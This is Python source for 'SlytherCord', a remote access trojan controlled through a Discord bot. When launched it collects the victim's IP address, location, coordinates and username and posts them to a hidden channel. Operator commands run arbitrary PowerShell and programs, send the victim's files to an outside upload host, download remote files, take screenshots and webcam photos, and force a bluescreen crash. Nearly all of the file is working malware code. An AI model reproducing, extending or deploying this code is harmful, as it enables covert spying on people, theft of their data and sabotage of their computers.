import discord
import sys
from settings import *
from cv2 import VideoCapture, imwrite, CAP_DSHOW
import os
import discord
import subprocess
import requests
import pyautogui
import ctypes
import sys
from threading import Timer
from datetime import datetime
from uuid import getnode as get_mac
import discord
import os
import pyaudio
import subprocess
import pyautogui
import numpy as np
import subprocess
import geocoder
import socket

import pyaudio

new_ascii = """ 
 .d8888b.  888          888    888                        .d8888b.                       888 
d88P  Y88b 888          888    888                       d88P  Y88b                      888 
Y88b.      888          888    888                       888    888                      888 
 "Y888b.   888 888  888 888888 88888b.   .d88b.  888d888 888         .d88b.  888d888 .d88888 
    "Y88b. 888 888  888 888    888 "88b d8P  Y8b 888P"   888        d88""88b 888P"  d88" 888 
      "888 888 888  888 888    888  888 88888888 888     888    888 888  888 888    888  888 
Y88b  d88P 888 Y88b 888 Y88b.  888  888 Y8b.     888     Y88b  d88P Y88..88P 888    Y88b 888 
 "Y8888P"  888  "Y88888  "Y888 888  888  "Y8888  888      "Y8888P"   "Y88P"  888     "Y88888 
                    888                                                                      
               Y8b d88P                                                                      
                "Y88P"  -Made by Isaaclins

    Usage:
    .help               - Shows this message
    .ping               - latency delay of the bot
    .cd <directory>     - Change Directory   
    .ls                 - List Directory
    .download <file>    - Download File   
    .upload <link>      - Upload File from link
    .cmd <cmd>          - Execute CMD Command 
    .run <file>         - Run an File   
    .screenshot OR .ss  - Take a Screenshot of the first monitor
    .blue               - sends a bluescreen ;)
    .start              - Adds the bot to the startup directory
    .exit               - closes the connection to the bot                                             
"""




commands = "\n".join([
    "help - Help Command",
    "ping - Ping Command",
    "cd - Change Directory",
    "ls - List Directory",
    "download <file> - Download File",
    "upload <link> - Upload File",
    "cmd - Execute CMD Command",
    "run <file> - Run an File",
    "screenshot - Take a Screenshot",
    "blue - DeadScreen",
    "start - Add To start",
    "exit - Exit The Session",
])



intents = discord.Intents.all()
intents.members = True
client = discord.Client(intents=intents)





async def find_channel_by_name(guild, channel_name):
    for channel in guild.channels:
        if channel.name == channel_name:
            return channel
    return None

async def create_channel(guild, mac_address):
    text_channel = await find_channel_by_name(guild, mac_address)

    if text_channel:
        print("Channel with name {} already exist.".format(mac_address))
        return text_channel

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
    }

    if not text_channel:
        text_channel = await guild.create_text_channel(mac_address, overwrites=overwrites)
        print("Text channel with name {} created.".format(mac_address))

    return text_channel

@client.event
async def on_ready():
    response = requests.get('https://ipapi.co/json/')
    data = response.json()
    ip_address = data.get('ip')
    city = data.get('city')
    country = data.get('country')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    username = os.getlogin()
    guild = client.get_guild(int(guild_id))
    mac_address = str(get_mac())
    print(await find_channel_by_name(guild, mac_address))
    channel = await find_channel_by_name(guild, mac_address)
    if not channel:
        print("Channel with name {} does not exist. Creating...".format(mac_address))
        channel = await guild.create_text_channel(mac_address)
        embed = discord.Embed(title="**Established connection**",colour=0x36393f, timestamp=datetime.now())
        embed.set_author(name="**STAR THIS PROJECT ON MY GITHUB**", url="https://github.com/isaaclins/SlytherCord",icon_url="https://cdn.discordapp.com/attachments/1114528537093865494/1128962359562621009/ogkush.png")
        embed.add_field(name="**IP Adress:**",value=f"```{ip_address}```",inline=True)
        embed.add_field(name="**Country:**", value=f"```{country}```",inline=True)
        embed.add_field(name="ㅤ", value="ㅤ",inline=True)
        embed.add_field(name="**Latitude:**", value=f"```{latitude}```",inline=True)
        embed.add_field(name="**Longitude**",value=f"```{longitude}```",inline=True)
        embed.add_field(name="ㅤ", value="ㅤ",inline=True)
        embed.add_field(name="**City:**",value=f"```{city}```",inline=True)
        embed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
        embed.add_field(name="ㅤ", value="ㅤ",inline=True)


        embed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
        embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
        embed.set_footer(text="Example Footer",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
        await channel.send(embed=embed)
    

        
@client.event
async def on_message(message):
    guild = client.get_guild(int(guild_id))
    if message.author != client.user:
    
        if message.channel.name == str(get_mac()): 
            

            if message.content == "help" or message.content == "Help":
                embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
                await message.reply(embed=embed)

            if message.content == "ping" or message.content == "Ping":
                embed = discord.Embed(title="Ping", description=f"```{round(client.latency * 1000)}ms```", color=0xfafafa)
                await message.reply(embed=embed)

            if message.content.startswith("cd") or message.content.startswith("Cd"):
                directory = message.content[3:]
                try:
                    os.chdir(directory)
                    files = "\n".join(os.listdir())
                    if files == "":
                        files = "No Files Found"
                    embed = discord.Embed(title=f"Changed Directory > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
                except:
                    embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
                await message.reply(embed=embed)

            if message.content == "ls" or message.content == "Ls":
                files = "\n".join(os.listdir())
                if files == "":
                    files = "No Files Found"
                embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
                await message.reply(embed=embed)

            if message.content.startswith("download") or message.content.startswith("Download"):
                file = message.content[9:]
                try:
                    link = requests.post("https://api.letsupload.cc/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
                    embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
                    await message.reply(embed=embed)
                except:
                    embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
                    await message.reply(embed=embed)

            if message.content.startswith("upload") or message.content.startswith("Upload"):
                link = message.content[7:]
                file = requests.get(link).content
                with open(os.path.basename(link), "wb") as f:
                    f.write(file)
                embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
                await message.reply(embed=embed)

            if message.content.startswith("shell") or message.content.startswith("Shell"):
                command = message.content[6:]
                output = subprocess.Popen(
                    ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
                ).communicate()[0].decode("utf-8")
                if output == "":
                    output = "No output"
                embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
                await message.reply(embed=embed)

            if message.content.startswith("run") or message.content.startswith("Run"):
                file = message.content[4:]
                print(file)
                subprocess.Popen(file, shell=True)
                embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
                await message.reply(embed=embed)

            if message.content.startswith("exit"):
                await message.channel.delete()
                await client.close()
            
            if message.content == "start":
                await message.reply("Ok Boss")

                
            if message.content == "blue" or message.content == "Blue":
                await message.reply("Attempting...", delete_after = .1)
                ntdll = ctypes.windll.ntdll
                prev_value = ctypes.c_bool()
                res = ctypes.c_ulong()
                ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
                if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
                    await message.reply("Blue Successful!")
                else:
                    await message.reply("Blue Failed! :(")

            if message.content.startswith("screenshot"):
                screenshot = pyautogui.screenshot()
                path = os.path.join(os.getenv("TEMP"), "screenshot.png")
                screenshot.save(path)
                file = discord.File(path)
                embed = discord.Embed(title="Screenshot", color=0xfafafa)
                embed.set_image(url="attachment://screenshot.png")
                await message.reply(embed=embed, file=file)

            if message.content == 'photo':
                webcam = VideoCapture(0, CAP_DSHOW)
                result, image = webcam.read()
                imwrite('webcam.png', image)
                await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +str(get_mac())+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
                subprocess.run('del webcam.png', shell=True)
                
            if message.content == 'purge':
                await message.reply('Purging...')
                await message.channel.purge(limit=None)
        else:
            print("MESSAGE SENT WAS:", message.content, "BY :" , message.author,"IN :" , message.channel,)


    
client.run(bot_token)


